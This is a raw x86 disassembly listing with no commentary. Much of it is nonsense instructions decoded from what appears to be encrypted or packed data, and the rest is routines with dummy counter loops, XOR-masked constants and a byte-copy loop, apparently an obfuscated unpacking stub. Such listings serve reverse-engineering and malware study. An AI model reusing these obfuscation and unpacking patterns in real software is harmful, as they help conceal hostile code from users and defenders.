  4029e3:	rol    DWORD PTR [edi-0x2ca69be3],cl
  4029e9:	jmp    0x3592:0xad9634d5
  4029f0:	int    0xce
  4029f2:	popa   
  4029f3:	jo     0x4029e8
  4029f5:	sbb    BYTE PTR [edi+edx*4-0x32],bl
  4029f9:	repnz add esp,DWORD PTR [ebx-0x4f95aef9]
  402a00:	lock pushf 
  402a02:	popf   
  402a03:	scas   eax,DWORD PTR es:[edi]
  402a04:	pop    es
  402a05:	xchg   BYTE PTR [edx+0x7e61ea9b],ch
  402a0b:	inc    ebp
  402a0c:	fs jp  0x4029cf
  402a0f:	sbb    al,0x6f
  402a11:	xor    BYTE PTR [eax],al
  402a13:	cdq    
  402a14:	sub    edi,esp
  402a16:	jbe    0x402a2d
  402a18:	(bad)  
  402a19:	adc    bl,BYTE PTR [ebx+0x2]
  402a1c:	or     al,0xd
  402a1e:	shl    DWORD PTR [edi+0x7d],0x1a
  402a22:	jp     0x402a1b
  402a24:	into   
  402a25:	mov    ebx,ss
  402a27:	sti    
  402a28:	dec    eax
  402a29:	shr    DWORD PTR [ebp-0x5b],cl
  402a2c:	xchg   edx,eax
  402a2d:	jle    0x402a4a
  402a2f:	ds clc 
  402a31:	fisttp DWORD PTR [edi]
  402a33:	loopne 0x402a15
  402a35:	clc    
  402a36:	sti    
  402a37:	or     edi,edi
  402a39:	mov    ds:0x227d166d,al
  402a3e:	mov    ebx,0x52ade09c
  402a43:	cld    
  402a44:	or     eax,0x36bdbbc3
  402a49:	adc    cl,BYTE PTR [ebx+ebx*2]
  402a4c:	dec    edi
  402a4d:	pop    ebx
  402a4e:	shl    DWORD PTR [ebx+0x113b75d8],1
  402a54:	jp     0x402ac8
  402a56:	das    
  402a57:	xchg   edi,eax
  402a58:	pop    ebx
  402a59:	cli    
  402a5a:	cmp    eax,DWORD PTR [esi-0x7c]
  402a5d:	sbb    al,bl
  402a5f:	xor    al,0x57
  402a61:	dec    eax
  402a62:	or     al,0xa7
  402a64:	or     eax,0x3e452f43
  402a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a6a:	mov    esp,esp
  402a6c:	rcl    dh,1
  402a6e:	imul   ecx,DWORD PTR [edx+0x43],0xe91a1c03
  402a75:	into   
  402a76:	add    BYTE PTR [eax],al
  402a78:	add    ah,ch
  402a7a:	test   eax,0xb57d3fe8
  402a7f:	sti    
  402a80:	mov    ecx,0xb7fd3b83
  402a85:	mov    cl,0x8a
  402a87:	sub    eax,0x7c0f0c37
  402a8c:	jl     0x402a30
  402a8e:	jl     0x402b0c
  402a90:	jl     0x402a69
  402a92:	(bad)  
  402a93:	dec    ecx
  402a94:	cmp    al,BYTE PTR ds:0x5ddc7fc2
  402a9a:	xor    ebx,ebx
  402a9c:	mov    ah,bl
  402a9e:	out    0x47,al
  402aa0:	sbb    DWORD PTR [edx],ecx
  402aa2:	out    0xa8,eax
  402aa4:	mov    BYTE PTR [edx+eax*8+0x66e8761a],bh
  402aab:	or     eax,0xb8bf2c9b
  402ab0:	test   DWORD PTR [ebx+0x16],0x602acb28
  402ab7:	mov    DWORD PTR [eax+0x73380fb7],edx
  402abd:	mov    esp,0xf7f14ee9
  402ac2:	cmp    al,0xf9
  402ac4:	sahf   
  402ac5:	pop    edi
  402ac6:	cmp    dl,BYTE PTR ds:0xe374f503
  402acc:	mov    dl,0xd
  402ace:	ins    BYTE PTR es:[edi],dx
  402acf:	inc    ecx
  402ad0:	cmp    DWORD PTR ds:0x45e0cdb3,ebp
  402ad6:	add    eax,ecx
  402ad8:	pop    es
  402ad9:	jp     0x402a81
  402adb:	sbb    edi,DWORD PTR ds:0x5a8d1b21
  402ae1:	xchg   edi,eax
  402ae2:	mov    al,0x57
  402ae4:	push   cs
  402ae5:	je     0x402aef
  402ae7:	or     bl,bl
  402ae9:	dec    ebx
  402aea:	pop    ss
  402aeb:	in     eax,dx
  402aec:	outs   dx,DWORD PTR ds:[esi]
  402aed:	xor    eax,0xb977797e
  402af2:	(bad)  
  402af3:	cmp    bh,BYTE PTR [ebx+0x131b92bf]
  402af9:	jne    0x402a97
  402afb:	push   edi
  402afc:	adc    eax,0xa3904824
  402b01:	adc    edx,eax
  402b03:	xchg   ecx,eax
  402b04:	fstp   QWORD PTR [ebx+0x483114fa]
  402b0a:	in     eax,dx
  402b0b:	cli    
  402b0c:	rol    BYTE PTR [edi+esi*4],cl
  402b0f:	ffree  st(0)
  402b11:	test   DWORD PTR [ebx+ebx*2+0x23affe0a],ebx
  402b18:	jne    0x402b8c
  402b1a:	add    cl,BYTE PTR [ecx+0x3bcf5504]
  402b20:	sub    eax,0x59fa7e09
  402b25:	int    0xd7
  402b27:	fild   WORD PTR [ebp+0x6b0d47f6]
  402b2d:	iret   
  402b2e:	sti    
  402b2f:	fcom   QWORD PTR [esi+0x9]
  402b32:	mov    esp,0xcbb467e7
  402b37:	inc    esp
  402b38:	jp     0x402b57
  402b3a:	mov    ds:0xec74eeb7,eax
  402b3f:	pop    esp
  402b40:	inc    edi
  402b41:	data16 xor BYTE PTR [edx+0x4b8b05a9],0x33
  402b49:	rol    BYTE PTR [ecx],cl
  402b4b:	pop    ebp
  402b4c:	hlt    
  402b4d:	jmp    0x402c20
  402b52:	dec    ebx
  402b53:	jge    0x402bcf
  402b55:	cmp    BYTE PTR [edx-0x7d],0x6d
  402b59:	jge    0x402b07
  402b5b:	push   cs
  402b5c:	loope  0x402b36
  402b5e:	xor    al,0xb4
  402b60:	xor    esi,DWORD PTR [edx+esi*4]
  402b63:	(bad)  
  402b65:	jl     0x402b09
  402b67:	jl     0x402be5
  402b69:	jl     0x402b85
  402b6b:	cmp    eax,0x6ed97f88
  402b70:	pop    edi
  402b71:	test   DWORD PTR [edi+ecx*8],0x52907a1e
  402b78:	jg     0x402ba0
  402b7a:	jl     0x402b98
  402b7c:	and    BYTE PTR [esi+ecx*4-0x442282f8],dh
  402b83:	or     eax,0xf2fc24e1
  402b88:	sbb    eax,0x32536129
  402b8d:	es jo  0x402b87
  402b90:	and    ebx,DWORD PTR [esi+0x1899149b]
  402b96:	sbb    DWORD PTR [ecx],esp
  402b98:	jns    0x402b7b
  402b9a:	jmp    0xcb23:0x171df7f3
  402ba1:	pop    ebp
  402ba2:	jecxz  0x402be5
  402ba4:	xchg   BYTE PTR [ecx+0x16],cl
  402ba7:	mov    al,ds:0xefa6afe8
  402bac:	inc    eax
  402bad:	cli    
  402bae:	inc    edi
  402baf:	ret    
  402bb0:	xchg   ebp,eax
  402bb1:	cwde   
  402bb2:	mov    ds:0x83596b07,al
  402bb7:	pop    edx
  402bb8:	aaa    
  402bb9:	adc    al,0x71
  402bbb:	ins    BYTE PTR es:[edi],dx
  402bbc:	lahf   
  402bbd:	cmp    DWORD PTR [ebp-0x79a181bc],0xf00709e8
  402bc7:	mov    ah,0xfd
  402bc9:	mov    ebx,0xd424c266
  402bce:	jo     0x402c2e
  402bd0:	jo     0x402ba5
  402bd2:	mov    al,ds:0xd3580e23
  402bd7:	xchg   BYTE PTR [edx],bh
  402bd9:	test   eax,0x789cd4ce
  402bde:	nop
  402bdf:	sar    bl,cl
  402be1:	(bad)  
  402be2:	pop    ecx
  402be3:	inc    esp
  402be4:	dec    ecx
  402be5:	xor    BYTE PTR [edi-0xe],dl
  402be8:	mov    ch,0xc7
  402bea:	cwde   
  402beb:	fstp   QWORD PTR [eax+0x26edabac]
  402bf1:	pop    eax
  402bf2:	jno    0x402bae
  402bf4:	mov    al,ds:0x7ca7080
  402bf9:	pop    esp
  402bfa:	pop    ecx
  402bfb:	aaa    
  402bfc:	push   0x901e04a6
  402c01:	or     cl,BYTE PTR ds:0xa2355bbe
  402c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c08:	dec    ebp
  402c09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c0a:	pop    ds
  402c0b:	iret   
  402c0c:	fwait
  402c0d:	pushw  ss
  402c0f:	dec    dh
  402c11:	(bad)  
  402c12:	shl    BYTE PTR [esi+0x26db2935],0x7b
  402c19:	out    dx,al
  402c1a:	adc    DWORD PTR [eax],ecx
  402c1c:	outs   dx,DWORD PTR ds:[esi]
  402c1d:	adc    ch,dh
  402c1f:	sbb    BYTE PTR [ebx-0x75],bl
  402c22:	inc    ebp
  402c23:	hlt    
  402c24:	pop    edi
  402c25:	pop    esi
  402c26:	pop    ebx
  402c27:	leave  
  402c28:	ret    0x10
  402c2b:	push   ebp
  402c2c:	mov    ebp,esp
  402c2e:	sub    esp,0x20
  402c31:	leave  
  402c32:	ret    0x10
  402c35:	push   ebp
  402c36:	mov    ebp,esp
  402c38:	push   ecx
  402c39:	and    DWORD PTR ds:0x4247d6,0x0
  402c43:	jmp    0x402c56
  402c48:	xor    eax,eax
  402c4a:	xor    eax,DWORD PTR ds:0x4247d6
  402c50:	inc    eax
  402c51:	mov    ds:0x4247d6,eax
  402c56:	cmp    DWORD PTR ds:0x4247d6,0x1e
  402c5d:	jae    0x402d01
  402c63:	cmp    DWORD PTR ds:0x4247d6,0x11
  402c6a:	jne    0x402c83
  402c70:	push   0x0
  402c72:	push   0x44b6e8
  402c77:	push   DWORD PTR [ebp-0x20]
  402c7a:	push   DWORD PTR [ebp-0x14]
  402c7d:	call   DWORD PTR ds:0x4430d0
  402c83:	cmp    DWORD PTR ds:0x4247d6,0x10
  402c8a:	jne    0x402c9e
  402c90:	xor    eax,eax
  402c92:	add    eax,DWORD PTR ds:0x4247d6
  402c98:	inc    eax
  402c99:	mov    ds:0x4247d6,eax
  402c9e:	jmp    0x402c48
  402ca3:	and    DWORD PTR ds:0x4489a4,0x0
  402cad:	mov    edx,DWORD PTR ds:0x4489a4
  402cb3:	inc    edx
  402cb4:	mov    DWORD PTR ds:0x4489a4,edx
  402cba:	cmp    DWORD PTR ds:0x4489a4,0xd
  402cc1:	jne    0x402cda
  402cc7:	push   0x4247d2
  402ccc:	push   DWORD PTR [ebp-0x28]
  402ccf:	push   0x3f88
  402cd4:	call   DWORD PTR ds:0x443000
  402cda:	cmp    DWORD PTR ds:0x4489a4,0xc
  402ce1:	jne    0x402cf4
  402ce7:	mov    edx,DWORD PTR ds:0x4489a4
  402ced:	inc    edx
  402cee:	mov    DWORD PTR ds:0x4489a4,edx
  402cf4:	cmp    DWORD PTR ds:0x4489a4,0x17
  402cfb:	jb     0x402cad
  402d01:	push   ecx
  402d02:	mov    eax,0xf89c8535
  402d07:	mov    DWORD PTR ds:0x4247ca,0x10
  402d11:	cmp    DWORD PTR ds:0x4247ca,0x0
  402d18:	je     0x402d61
  402d1e:	cmp    DWORD PTR ds:0x4247ca,0x1d
  402d25:	jne    0x402d4f
  402d2b:	push   0x44b6d0
  402d30:	push   0x44b6d0
  402d35:	push   0x8e35
  402d3a:	push   0x4109ab
  402d3f:	push   0x410971
  402d44:	push   0x410927
  402d49:	call   DWORD PTR ds:0x443348
  402d4f:	mov    edx,DWORD PTR ds:0x4247ca
  402d55:	dec    edx
  402d56:	mov    DWORD PTR ds:0x4247ca,edx
  402d5c:	jmp    0x402d11
  402d61:	mov    DWORD PTR [ebp-0x8],eax
  402d64:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  402d6b:	mov    edx,DWORD PTR [ebp-0x8]
  402d6e:	push   esi
  402d6f:	mov    ecx,0x7510857
  402d74:	xor    edx,ecx
  402d76:	mov    esi,0x32729e
  402d7b:	push   edi
  402d7c:	mov    edi,DWORD PTR [ebp+0x10]
  402d7f:	add    edx,esi
  402d81:	cmp    edi,edx
  402d83:	je     0x403249
  402d89:	mov    edx,DWORD PTR [ebp-0x8]
  402d8c:	mov    eax,DWORD PTR [ebp-0x4]
  402d8f:	xor    eax,ecx
  402d91:	mov    edi,0xffcd8d62
  402d96:	sub    edi,eax
  402d98:	add    edi,DWORD PTR [ebp+0x10]
  402d9b:	xor    edx,ecx
  402d9d:	add    edx,esi
  402d9f:	cmp    edx,edi
  402da1:	ja     0x4030d5
  402da7:	jmp    0x402f16
  402dac:	sbb    eax,0xa4b3a405
  402db1:	ins    DWORD PTR es:[edi],dx
  402db2:	std    
  402db3:	pop    ebp
  402db4:	mov    eax,0xf9e45e2b
  402db9:	lods   eax,DWORD PTR ds:[si]
  402dbb:	jne    0x402db5
  402dbd:	push   cs
  402dbe:	jl     0x402e3c
  402dc0:	into   
  402dc1:	jg     0x402e3f
  402dc3:	jl     0x402e10
  402dc5:	in     al,dx
  402dc6:	mov    ah,0x82
  402dc8:	not    bh
  402dca:	sti    
  402dcb:	stos   DWORD PTR es:[edi],eax
  402dcc:	(bad)  
  402dcd:	xchg   edi,eax
  402dce:	mov    ch,0x21
  402dd0:	mov    esp,0x4e999625
  402dd5:	inc    eax
  402dd6:	jns    0x402e44
  402dd8:	adc    BYTE PTR [edi-0x63],0xe3
  402ddc:	jecxz  0x402d89
  402dde:	sbb    BYTE PTR ds:0x69c1ce47,ch
  402de4:	jbe    0x402e0b
  402de6:	jnp    0x402e58
  402de8:	mov    ds:0xfd5020b2,eax
  402ded:	mov    eax,0xc0bb1ff8
  402df2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402df3:	ret    
  402df4:	inc    esi
  402df5:	sbb    eax,0x7de381a7
  402dfa:	sub    eax,0x4067b865
  402dff:	mov    al,BYTE PTR [ebp-0x60b922e1]
  402e05:	jp     0x402e65
  402e07:	xchg   esi,eax
  402e08:	sbb    cl,BYTE PTR [ebp-0x29afa692]
  402e0e:	div    ecx
  402e10:	and    al,0x80
  402e12:	and    DWORD PTR [ecx],ebp
  402e14:	sbb    ah,BYTE PTR [ebx]
  402e16:	mov    al,ds:0x149d6532
  402e1b:	cmp    ah,BYTE PTR [eax-0x6fd0c4ed]
  402e21:	xchg   ebx,eax
  402e22:	and    al,0xd7
  402e24:	mov    esi,0xae44780a
  402e29:	addr16 ror esi,cl
  402e2c:	jmp    0xf707:0xccaac923
  402e33:	adc    BYTE PTR [eax],ah
  402e35:	jmp    0x5e9a:0x77e3e73b
  402e3c:	adc    ebp,edx
  402e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e3f:	(bad)  
  402e40:	xor    dl,BYTE PTR [ebx-0x62]
  402e43:	outs   dx,BYTE PTR ds:[esi]
  402e44:	cdq    
  402e45:	retf   
  402e46:	push   ebx
  402e48:	add    DWORD PTR [edi-0x731c16bb],esp
  402e4e:	mov    bl,BYTE PTR [ebx+0x5632d78a]
  402e54:	jb     0x402e48
  402e56:	mov    al,0x7c
  402e58:	and    BYTE PTR [eax+0x169091a7],bh
  402e5e:	por    mm5,QWORD PTR [edx-0x2b9b0eb7]
  402e65:	push   esp
  402e66:	retf   0x9926
  402e69:	fldenv [esi+esi*1]
  402e6c:	ret    0xdd6e
  402e6f:	sbb    ecx,edi
  402e71:	(bad)  
  402e72:	shl    BYTE PTR [eax+0x30c15fb3],1
  402e78:	pushf  
  402e79:	add    eax,0x97dc654
  402e7e:	mov    edi,0xeec2754f
  402e83:	ficom  DWORD PTR [ecx-0x71]
  402e86:	shl    BYTE PTR [edx+edx*4+0x3b4ee459],0xf8
  402e8e:	loope  0x402e25
  402e90:	cdq    
  402e91:	mov    ds:0x2d10e4ac,eax
  402e96:	sub    BYTE PTR [edx],bh
  402e98:	xor    eax,0xea41fcb3
  402e9d:	sti    
  402e9e:	cdq    
  402e9f:	call   0xf7fe6fcc
  402ea4:	cmp    al,0x8f
  402ea6:	jmp    0x73a:0x5c0b6e97
  402ead:	pop    esi
  402eae:	pop    eax
  402eaf:	push   0x711c8653
  402eb4:	xlat   BYTE PTR ds:[ebx]
  402eb5:	in     al,dx
  402eb6:	test   DWORD PTR [esi-0x65],edx
  402eb9:	mov    al,ds:0xd0797ee3
  402ebe:	mov    DWORD PTR [edx+0x33b46b47],esi
  402ec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ec5:	mov    ah,0x8e
  402ec7:	adc    DWORD PTR [ebx],edi
  402ec9:	std    
  402eca:	push   edi
  402ecb:	lock sbb eax,0x625d5bfd
  402ed1:	call   0x4671:0x8632ce80
  402ed8:	and    DWORD PTR [ebx+esi*4-0x1f],ebx
  402edc:	test   eax,0xd1c33f04
  402ee1:	mov    ds:0x45d70e4a,al
  402ee6:	adc    eax,0x8d309b33
  402eeb:	add    eax,0xdef57744
  402ef0:	or     ah,BYTE PTR [eax+0x47]
  402ef3:	xchg   esp,ecx
  402ef5:	push   edx
  402ef6:	xor    edx,DWORD PTR [ecx-0x17]
  402ef9:	mov    gs,WORD PTR [edi-0x43]
  402efc:	iret   
  402efd:	pusha  
  402efe:	test   BYTE PTR [ebx],dl
  402f00:	mov    bh,0x74
  402f02:	loopne 0x402ef5
  402f04:	ret    
  402f05:	ds (bad) 
  402f07:	into   
  402f08:	retf   0xca8b
  402f0b:	push   ss
  402f0c:	(bad)  
  402f0d:	cmc    
  402f0e:	rcr    DWORD PTR [ebx-0x73],1
  402f11:	int    0xea
  402f13:	outs   dx,DWORD PTR ds:[esi]
  402f14:	test   al,dl
  402f16:	push   ebx
  402f17:	jmp    0x402f21
  402f1c:	mov    esi,0x32729e
  402f21:	mov    eax,DWORD PTR [ebp-0x8]
  402f24:	mov    edi,DWORD PTR [ebp-0x4]
  402f27:	xor    edi,ecx
  402f29:	add    edi,esi
  402f2b:	mov    esi,DWORD PTR [ebp+0x8]
  402f2e:	imul   edi,edx
  402f31:	mov    ebx,DWORD PTR [ebp+0xc]
  402f34:	xor    eax,ecx
  402f36:	add    eax,edx
  402f38:	mov    al,BYTE PTR [ebx+eax*1+0x32729e]
  402f3f:	mov    BYTE PTR [edi+esi*1],al
  402f42:	mov    eax,DWORD PTR [ebp-0x4]
  402f45:	xor    eax,ecx
  402f47:	lea    edx,[edx+eax*1+0x32729e]
  402f4e:	mov    eax,DWORD PTR [ebp-0x4]
  402f51:	xor    eax,ecx
  402f53:	mov    esi,0xffcd8d62
  402f58:	sub    esi,eax
  402f5a:	add    esi,DWORD PTR [ebp+0x10]
  402f5d:	jmp    0x4030cc
  402f62:	jp     0x402f87
  402f64:	pop    ebp
  402f65:	cmp    BYTE PTR [ebp+0x7a],bl
  402f68:	jge    0x402fcf
  402f6a:	mov    ss,WORD PTR [ebp+0x4f]
  402f6d:	push   edx
  402f6e:	imul   ebx,DWORD PTR [ebp+0x13],0x7c014a70
  402f75:	jl     0x402f45
  402f77:	jg     0x402ff5
  402f79:	jl     0x402f7f
  402f7b:	cmp    BYTE PTR [ebx+0x49b3529f],bl
  402f81:	dec    esi
  402f82:	arpl   WORD PTR [esp+edx*2+0x4260495f],ax
  402f89:	sti    
  402f8a:	arpl   cx,di
  402f8c:	nop
  402f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f8e:	int3   
  402f8f:	xchg   ecx,eax
  402f90:	mov    ds:0xdcaac1f0,al
  402f95:	mov    ds,ebx
  402f97:	mov    dh,0xde
  402f99:	retf   0x9aae
  402f9c:	inc    esp
  402f9d:	bound  ebp,QWORD PTR [ebx-0x42]
  402fa0:	dec    edx
  402fa1:	std    
  402fa2:	sahf   
  402fa3:	mov    bl,0xef
  402fa5:	and    DWORD PTR ds:0x7cf3bf2d,0xffffff81
  402fac:	and    DWORD PTR [ebp-0x23],0x353ed83d
  402fb3:	hlt    
  402fb4:	push   ss
  402fb5:	mov    dl,0x4e
  402fb7:	fiadd  WORD PTR [ecx+ebp*4]
  402fba:	mov    ch,0x20
  402fbc:	not    DWORD PTR [ecx]
  402fbe:	lods   al,BYTE PTR ds:[esi]
  402fbf:	out    dx,al
  402fc0:	addr16 or al,0x90
  402fc3:	shl    edx,cl
  402fc5:	arpl   bx,ax
  402fc7:	cli    
  402fc8:	in     al,0xd4
  402fca:	fs mov edi,0xe47e15ec
  402fd0:	ds pop ebp
  402fd2:	int3   
  402fd3:	stos   BYTE PTR es:[edi],al
  402fd4:	hlt    
  402fd5:	jne    0x402f6a
  402fd7:	cld    
  402fd8:	ins    DWORD PTR es:[edi],dx
  402fd9:	xor    al,0xf2
  402fdb:	add    dh,BYTE PTR ds:0xa76669cc
  402fe1:	cld    
  402fe2:	fiadd  WORD PTR [eax]
  402fe4:	pop    edx
  402fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fe6:	stos   DWORD PTR es:[edi],eax
  402fe7:	retf   0x108d
  402fea:	mov    ecx,0xcc57efa6
  402fef:	call   0x4817:0xd978b9a8
  402ff6:	mov    gs,eax
  402ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ff9:	push   esi
  402ffa:	mov    dh,0xdb
  402ffc:	nop
  402ffd:	lea    eax,[ebp+0x4b]
  403000:	push   ss
  403001:	or     al,dh
  403003:	test   al,dh
  403005:	mov    esi,0x18867e0e
  40300a:	outs   dx,DWORD PTR ds:[esi]
  40300b:	push   cs
  40300c:	enter  0x6cc0,0x3c
  403010:	scas   eax,DWORD PTR es:[edi]
  403011:	aas    
  403012:	shl    BYTE PTR [esp+ebx*2],0xa2
  403016:	pop    ecx
  403017:	lds    edi,FWORD PTR [ecx-0x45]
  40301a:	add    BYTE PTR [edi],cl
  40301c:	nop
  40301d:	cmp    al,0xda
  40301f:	xor    BYTE PTR [edi+eax*8-0x56e89883],0xf
  403027:	add    al,0xea
  403029:	or     al,0xb3
  40302b:	in     eax,0x92
  40302d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40302e:	ror    BYTE PTR [edx],0x2
  403031:	adc    al,0x5
  403033:	and    eax,0xd4e9778c
  403038:	mov    ds:0xe8889e70,al
  40303d:	aaa    
  40303e:	cmp    edx,DWORD PTR [ebp+edi*4-0x77]
  403042:	fistp  WORD PTR [ebp-0x6f]
  403045:	ficomp WORD PTR [ecx+0x2b]
  403048:	mov    esp,0xbf9c6fc7
  40304d:	mov    ch,0xe6
  40304f:	call   0x3d33ebeb
  403054:	sbb    bl,dl
  403056:	sub    al,0x7c
  403058:	sub    al,0x15
  40305a:	loop   0x403003
  40305c:	(bad)  
  40305d:	into   
  40305e:	mov    ebp,edx
  403060:	mov    dl,0x8e
  403062:	mov    edi,0x8fbfbc3f
  403067:	cmp    DWORD PTR [ebx],ebp
  403069:	ja     0x402ff9
  40306b:	mov    ah,0x26
  40306d:	pop    ss
  40306e:	js     0x403068
  403070:	mov    bh,0x9d
  403072:	mov    bl,0x63
  403074:	fcomip st,st(1)
  403076:	dec    esp
  403077:	in     eax,0xae
  403079:	imul   ebx,DWORD PTR [edi],0xb7d68f9e
  40307f:	jg     0x4030a0
  403081:	mov    edi,DWORD PTR [edi]
  403083:	daa    
  403084:	mov    ebx,0xe20762e1
  403089:	sbb    al,0xaf
  40308b:	cmp    eax,0x8020d36d
  403090:	xchg   DWORD PTR [ebp+0x71],ecx
  403093:	(bad)  
  403094:	shl    edi,cl
  403096:	popa   
  403097:	cmp    eax,0xcbb2857
  40309c:	(bad)  
  40309d:	dec    edi
  40309e:	jb     0x40311e
  4030a0:	ror    BYTE PTR [edi-0x26eb474f],1
  4030a6:	cmp    ah,ch
  4030a8:	adc    eax,0x50b6a290
  4030ad:	fld    TBYTE PTR [eax-0x5941d858]
  4030b3:	ret    
  4030b4:	fnstenv [ecx+0x4a353db2]
  4030ba:	xchg   edx,eax
  4030bb:	enter  0x21f1,0x51
  4030bf:	scas   eax,DWORD PTR es:[edi]
  4030c0:	lds    esp,FWORD PTR [edi+0x2c4f33d2]
  4030c6:	shr    DWORD PTR [esi+0x790ec8eb],1
  4030cc:	cmp    edx,esi
  4030ce:	jbe    0x402f1c
  4030d4:	pop    ebx
  4030d5:	mov    eax,0xf89c8534
  4030da:	jmp    0x403249
  4030df:	jno    0x403104
  4030e1:	in     al,0x69
  4030e3:	cli    
  4030e4:	ins    DWORD PTR es:[edi],dx
  4030e5:	cmp    DWORD PTR [ebx+0x12],0x74299de8
  4030ec:	fcomp  st(7)
  4030ee:	std    
  4030ef:	sbb    al,0x3
  4030f1:	jl     0x40316f
  4030f3:	into   
  4030f4:	jg     0x403172
  4030f6:	jl     0x403111
  4030f8:	outs   dx,BYTE PTR ds:[esi]
  4030f9:	mov    ebp,0xaf34fcdf
  4030fe:	push   edi
  4030ff:	add    ebp,esi
  403101:	jge    0x40311d
  403103:	push   0x23
  403105:	addr16 js 0x40313a
  403108:	pop    es
  403109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40310a:	hlt    
  40310b:	mov    esp,0xecb32890
  403110:	scas   al,BYTE PTR es:[edi]
  403111:	mov    esp,0x2527fab5
  403116:	fmul   QWORD PTR [edx-0x4c]
  403119:	inc    edi
  40311a:	fidivr DWORD PTR [esi-0x6f]
  40311d:	(bad)  
  40311e:	or     eax,0x9b6b79d2
  403123:	aas    
  403124:	xor    BYTE PTR [eax-0xc],cl
  403127:	(bad)  
  403128:	pusha  
  403129:	shr    DWORD PTR [ebx-0x73a7522d],cl
  40312f:	cmp    DWORD PTR [eax-0x50ff6e25],ecx
  403135:	push   ss
  403136:	(bad)  [edi-0x35ce22a6]
  40313c:	daa    
  40313d:	repz pop es
  40313f:	cmpps  xmm4,XMMWORD PTR [eax+0x13],0x4c
  403144:	sub    BYTE PTR [eax+0x2],0x79
  403148:	(bad)  [edx-0x1a]
  40314b:	sbb    eax,0x405692a2
  403150:	das    
  403151:	xchg   esp,eax
  403152:	ins    DWORD PTR es:[edi],dx
  403153:	pop    eax
  403154:	jbe    0x4031d1
  403156:	mov    ch,0x93
  403158:	mov    ds:0x8b587b10,al
  40315d:	addr16 push ebx
  40315f:	add    edi,ebp
  403161:	dec    ecx
  403162:	int    0x8a
  403164:	(bad)  
  403165:	leave  
  403166:	fcomip st,st(7)
  403168:	rsm    
  40316a:	(bad)  
  40316b:	cmp    DWORD PTR [ecx-0x17],esp
  40316e:	adc    DWORD PTR [edx-0x6fbb9e61],0xffffffd6
  403175:	xchg   esi,eax
  403176:	xor    ah,BYTE PTR [ecx+0x13]
  403179:	and    eax,0x691f1639
  40317e:	mov    ebp,0x871a402
  403183:	scas   eax,DWORD PTR es:[edi]
  403184:	out    0x37,al
  403186:	popa   
  403187:	inc    edx
  403188:	cmp    ebp,DWORD PTR [edi+0x66]
  40318b:	mov    esp,0x364b31e1
  403190:	pop    esi
  403191:	inc    BYTE PTR [eax-0x7b]
  403194:	push   eax
  403195:	in     eax,0xa2
  403197:	jo     0x403217
  403199:	cmp    BYTE PTR [eax+0x2a],bh
  40319c:	inc    esp
  40319d:	xor    eax,0x2cc4d67d
  4031a2:	sbb    ebp,DWORD PTR [ebx+0x33]
  4031a5:	jl     0x403168
  4031a7:	adc    bh,BYTE PTR [eax+0x4d]
  4031aa:	retf   
  4031ab:	pusha  
  4031ac:	add    eax,0x130e2834
  4031b1:	dec    esp
  4031b2:	or     dl,dh
  4031b4:	(bad)  
  4031b5:	in     al,0x13
  4031b7:	enter  0xd16d,0xb9
  4031bb:	outs   dx,BYTE PTR ds:[esi]
  4031bc:	cmp    eax,0xe3952d13
  4031c1:	mov    eax,esi
  4031c3:	sbb    DWORD PTR [ecx],eax
  4031c5:	test   eax,0x52dcc546
  4031ca:	jns    0x40321a
  4031cc:	ror    BYTE PTR [esi+ecx*8-0x920067e],cl
  4031d3:	dec    edx
  4031d4:	jl     0x4031ec
  4031d6:	add    al,0x4d
  4031d8:	in     eax,0x8
  4031da:	dec    esi
  4031db:	mov    ds,WORD PTR [edi+0x39]
  4031de:	je     0x40321a
  4031e0:	jnp    0x4031f4
  4031e2:	mov    bl,0x33
  4031e4:	sub    ebx,DWORD PTR [eax+0x6062d8f6]
  4031ea:	imul   ebx,esp,0x93da914a
  4031f0:	shl    BYTE PTR [ebp+0x2b],1
  4031f3:	rcl    BYTE PTR [ecx-0x1c2cd69c],0x7a
  4031fa:	ja     0x4031d5
  4031fc:	push   0xe111c65a
  403201:	cwde   
  403202:	repz add bl,BYTE PTR [ebp+0x16]
  403206:	cmp    al,bh
  403208:	ds pop edx
  40320a:	lods   al,BYTE PTR ds:[esi]
  40320b:	ror    BYTE PTR [ebp+edx*4+0x5abcdf74],cl
  403212:	jle    0x4031b1
  403214:	mov    esi,0xd316fdf0
  403219:	pusha  
  40321a:	cmc    
  40321b:	jbe    0x40321b
  40321d:	scas   al,BYTE PTR es:[edi]
  40321e:	mov    edx,0x41313bcd
  403223:	add    eax,0xfd8d993c
  403228:	jl     0x4031d7
  40322a:	cmp    esi,DWORD PTR [edi+esi*1-0x15d9d965]
  403231:	call   0xc0a9:0xe3760d19
  403238:	xchg   esi,eax
  403239:	push   es
  40323a:	cmp    DWORD PTR es:0x6526221e,esi
  403241:	dec    edx
  403242:	or     al,0x8f
  403244:	ss jnp 0x403245
  403247:	sub    BYTE PTR [eax+0x5f],bh
  40324a:	pop    esi
  40324b:	leave  
  40324c:	ret    0xc
  40324f:	push   ebp
  403250:	mov    ebp,esp
  403252:	mov    eax,ds:0x445224
  403257:	add    DWORD PTR ds:0x448998,edx
  40325d:	mov    edx,0x32729e
  403262:	movzx  ecx,WORD PTR ds:0x4247d6
  403269:	or     DWORD PTR ds:0x44e40c,ecx
  40326f:	sub    eax,edx
  403271:	mov    ecx,DWORD PTR ds:0x44e41c
  403277:	or     DWORD PTR ds:0x44899c,ecx
  40327d:	mov    ecx,0x7510857
  403282:	and    DWORD PTR ds:0x44b6d0,0x4489a8
  40328c:	push   esi
  40328d:	and    DWORD PTR ds:0x41074b,0x0
  403297:	jmp    0x4032a9
  40329c:	mov    esi,DWORD PTR ds:0x41074b
  4032a2:	inc    esi
  4032a3:	mov    DWORD PTR ds:0x41074b,esi
  4032a9:	cmp    DWORD PTR ds:0x41074b,0x18
  4032b0:	jae    0x4032e1
